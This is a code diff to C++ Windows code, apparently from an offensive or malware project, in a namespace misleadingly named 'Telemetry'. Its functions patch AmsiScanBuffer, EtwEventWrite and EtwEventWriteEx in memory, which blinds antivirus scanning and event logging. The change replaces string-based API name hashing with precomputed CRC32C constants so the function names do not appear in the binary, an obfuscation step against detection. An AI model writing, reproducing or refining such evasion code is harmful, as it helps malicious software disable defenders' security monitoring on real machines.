@@ -13,6 +13,11 @@
 
 namespace Telemetry
 {
+    // Pre-computed CRC32C hash constants
+    static constexpr DWORD HASH_AmsiScanBuffer = 0xBEB2C84D;
+    static constexpr DWORD HASH_EtwEventWrite  = 0xC012A0B5;
+    static constexpr DWORD HASH_EtwEventWriteEx = 0xECF120DA;
+
     bool PatchAMSI()
     {
         // Resolve kernel32 APIs once
@@ -29,7 +34,7 @@ namespace Telemetry
         if (!hAmsi) return true; // Not loaded = nothing to patch, success
 
         // Find AmsiScanBuffer via CRC32C hash
-        void* pAmsiScanBuffer = (void*)Api::GetProcByHashCrc(hAmsi, Crc32C::ConstHash("AmsiScanBuffer"));
+        void* pAmsiScanBuffer = (void*)Api::GetProcByHashCrc(hAmsi, HASH_AmsiScanBuffer);
         if (!pAmsiScanBuffer) return false;
 
         // Patch bytes: mov eax, 0x80070057 (E_INVALIDARG) ; ret
@@ -62,7 +67,7 @@ namespace Telemetry
         if (!pVP) return false;
 
         // EtwEventWrite via CRC32C hash
-        void* pEtwEventWrite = (void*)Api::GetProcByHashCrc(hNtdll, Crc32C::ConstHash("EtwEventWrite"));
+        void* pEtwEventWrite = (void*)Api::GetProcByHashCrc(hNtdll, HASH_EtwEventWrite);
         if (!pEtwEventWrite) return false;
 
         // Patch: make it return STATUS_SUCCESS (0) immediately
@@ -96,7 +101,7 @@ namespace Telemetry
         if (!pVP) return false;
 
         // EtwEventWriteEx via CRC32C hash
-        void* pFunc = (void*)Api::GetProcByHashCrc(hNtdll, Crc32C::ConstHash("EtwEventWriteEx"));
+        void* pFunc = (void*)Api::GetProcByHashCrc(hNtdll, HASH_EtwEventWriteEx);
         if (!pFunc) return true; // Function doesn't exist on this Windows version — OK
 
 #if defined(_WIN64)
